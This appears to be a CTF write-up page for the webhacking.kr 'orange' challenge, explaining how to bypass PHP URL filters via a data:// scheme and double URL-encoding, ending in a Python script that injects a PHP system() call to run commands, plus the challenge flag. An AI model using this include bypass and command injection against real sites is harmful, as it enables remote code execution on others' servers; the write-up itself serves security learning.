@@ -1,0 +1,124 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset='utf-8'>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="/CTF_writeups/assets/css/style.css?v=6aacf4c090fc5e966ec687925a0bf39a46c3a14c">
+    <link rel="shortcut icon" type="image/x-icon" href="/CTF_writeups/favicon.ico">
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>orange | Avishai’s CTF Writeups</title>
+<meta name="generator" content="Jekyll v3.10.0" />
+<meta property="og:title" content="orange" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="…" />
+<meta property="og:description" content="…" />
+<link rel="canonical" href="http://localhost:4000/CTF_writeups/webhacking.kr/orange.html" />
+<meta property="og:url" content="http://localhost:4000/CTF_writeups/webhacking.kr/orange.html" />
+<meta property="og:site_name" content="Avishai’s CTF Writeups" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="orange" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebPage","description":"…","headline":"orange","url":"http://localhost:4000/CTF_writeups/webhacking.kr/orange.html"}</script>
+<!-- End Jekyll SEO tag -->
+
+  </head>
+
+  <body>
+
+    <header>
+      <div class="container">
+        <a id="a-title" href="/CTF_writeups/">
+          <h1>Avishai's CTF Writeups</h1>
+        </a>
+        <h2>...</h2>
+
+        <section id="downloads">
+          
+          <a href="https://github.com/avishaigonen123/CTF_writeups" class="btn btn-github"><span class="icon"></span>View on GitHub</a>
+        </section>
+      </div>
+    </header>
+
+    <div class="container">
+      <section id="main_content">
+        <h1 id="webhacking-orange-solution">webhacking orange Solution</h1>
+
+<p>It looks like SSRF, we can supply the <code class="language-plaintext highlighter-rouge">url</code> parameter.</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$url</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'url'</span><span class="p">]</span><span class="mf">.</span><span class="s2">".txt"</span><span class="p">;</span>
+    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">filter_var</span><span class="p">(</span><span class="nv">$url</span><span class="p">,</span> <span class="no">FILTER_VALIDATE_URL</span><span class="p">))</span> <span class="k">exit</span><span class="p">(</span><span class="s2">"invalid url"</span><span class="p">);</span>
+    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">preg_match</span><span class="p">(</span><span class="s2">"/http:\/\/webhacking.kr:10009\//"</span><span class="p">,</span><span class="nv">$url</span><span class="p">))</span> <span class="k">exit</span><span class="p">(</span><span class="s2">"invalid server"</span><span class="p">);</span>
+    <span class="k">if</span><span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s2">"/@|#|\(|\)|</span><span class="se">\\</span><span class="s2">$|`|'|</span><span class="se">\"</span><span class="s2">|_|</span><span class="si">{</span><span class="nv">|</span><span class="si">}</span><span class="s2">|\?/"</span><span class="p">,</span><span class="nv">$url</span><span class="p">))</span> <span class="k">exit</span><span class="p">(</span><span class="s2">"you are not orange"</span><span class="p">);</span>
+    <span class="k">if</span><span class="p">((</span><span class="nb">parse_url</span><span class="p">(</span><span class="nv">$url</span><span class="p">)[</span><span class="s1">'host'</span><span class="p">]</span> <span class="o">!==</span> <span class="s2">"webhacking.kr"</span><span class="p">)</span> <span class="o">||</span> <span class="p">(</span><span class="nb">parse_url</span><span class="p">(</span><span class="nv">$url</span><span class="p">)[</span><span class="s1">'port'</span><span class="p">]</span> <span class="o">!==</span> <span class="mi">10009</span><span class="p">))</span> <span class="k">exit</span><span class="p">(</span><span class="s2">"invalid host or port"</span><span class="p">);</span>
+    <span class="k">if</span><span class="p">(</span><span class="nb">parse_url</span><span class="p">(</span><span class="nv">$url</span><span class="p">)[</span><span class="s1">'user'</span><span class="p">]</span> <span class="o">||</span> <span class="nb">parse_url</span><span class="p">(</span><span class="nv">$url</span><span class="p">)[</span><span class="s1">'pass'</span><span class="p">])</span> <span class="k">exit</span><span class="p">(</span><span class="s2">"you are not orange"</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p>There are multiple checks, we need to build our payload step by step, to pass all the checks. Let’s GO!</p>
+
+<h3 id="filter_varurl-filter_validate_url"><em><code class="language-plaintext highlighter-rouge">filter_var($url, FILTER_VALIDATE_URL)</code></em></h3>
+<p>We need to supply valid URL, this is the <a href="https://www.ietf.org/rfc/rfc2396">RFC2396</a>.
+This is the structure of valid URL: <code class="language-plaintext highlighter-rouge">&lt;scheme&gt;://&lt;authority&gt;&lt;path&gt;?&lt;query&gt;</code></p>
+
+<h3 id="preg_matchhttpwebhackingkr10009url"><em><code class="language-plaintext highlighter-rouge">preg_match("/http:\/\/webhacking.kr:10009\//",$url)</code></em></h3>
+<p>We must supply this string inside our input: <code class="language-plaintext highlighter-rouge">http://webhacking.kr:10009/</code></p>
+
+<h3 id="preg_match_url"><em><code class="language-plaintext highlighter-rouge">preg_match("/@|#|\(|\)|\\$|`|'|\"|_|{|}|\?/",$url)</code></em></h3>
+<p>We can’t supply any of this characters… so, trying to use <code class="language-plaintext highlighter-rouge">@</code> or <code class="language-plaintext highlighter-rouge">#</code> won’t work… something like this:
+<code class="language-plaintext highlighter-rouge">http://webhacking.kr:10009/@evil.com/</code> :|. 
+So, this paper: <a href="https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf">A New Era of SSRF</a> from Orange Tsai won’t work.</p>
+
+<h3 id="parse_urlurlhost--webhackingkr--parse_urlurlport--10009"><em><code class="language-plaintext highlighter-rouge">parse_url($url)['host'] !== "webhacking.kr") || (parse_url($url)['port'] !== 10009)</code></em></h3>
+<p>We must supply in the host <code class="language-plaintext highlighter-rouge">webhacking.kr</code> and in the port <code class="language-plaintext highlighter-rouge">10009</code>. For example, this won’t work:
+<code class="language-plaintext highlighter-rouge">http://blabla:1003/http://webhacking.kr/</code>.</p>
+
+<h3 id="parse_urlurluser--parse_urlurlpass"><em><code class="language-plaintext highlighter-rouge">parse_url($url)['user'] || parse_url($url)['pass'])</code></em></h3>
+<p>Another mitigation, to stop us from manipulate the URL to treat the legit host as <code class="language-plaintext highlighter-rouge">username</code> or <code class="language-plaintext highlighter-rouge">passowrd</code>.</p>
+
+<h2 id="attack">ATTACK</h2>
+<p>We can insert this: <code class="language-plaintext highlighter-rouge">http://webhacking.kr:10009/,http://webhacking.kr:10009/</code> (notice the <em>,</em>). 
+However we can also change the url scheme to data: <code class="language-plaintext highlighter-rouge">data://webhacking.kr:10009/,http://webhacking.kr:10009/</code>, and then we receive this response:
+<img src="/CTF_writeups/webhacking.kr/images/orange_data_scheme.png" alt="data scheme" /></p>
+
+<h4 id="the-trick">THE TRICK</h4>
+<p>All the parsing functions process the content without url-decoding it, but the <code class="language-plaintext highlighter-rouge">include</code> function decode it! so, let’s try give this payload:
+<code class="language-plaintext highlighter-rouge">data://webhacking.kr:10009/,http://webhacking.kr:10009/%2540</code>
+<img src="/CTF_writeups/webhacking.kr/images/orange_parsing_bypass.png" alt="parsing bypass" /></p>
+
+<p>WOW! if we can insert <code class="language-plaintext highlighter-rouge">@</code>, so we can insert also our php code :)</p>
+
+<p>I wrote short script, you can use it: [orange.py]</p>
+<pre><code class="language-scripts/orange.py">import urllib.parse
+import requests
+import re
+
+# Change the command to do what you want
+# For example, to read the flag file, you can use:
+cmd = "cat /flag"
+payload = urllib.parse.quote(f"&lt;?php echo system('{cmd}') ?&gt;")
+
+URL = "http://webhacking.kr:10009/"
+params = {
+    'url': f'data://webhacking.kr:10009/,http://webhacking.kr:10009/{payload}'
+}
+
+req = requests.get(URL, params=params)
+
+# if you want to see the response text, uncomment the next line
+# print(req.text)
+
+# Extract the flag from the response
+# Assuming the flag is in the format FLAG{...}
+res = re.search(r'FLAG{(.*)}', req.text)
+print(res.group(0) if res else "No flag found")
+
+
+</code></pre>
+
+<p><strong>Flag:</strong> <strong><em><code class="language-plaintext highlighter-rouge">FLAG{hardcore_from_7.1}</code></em></strong></p>
+
+      </section>
+    </div>
+  </body>
+</html>
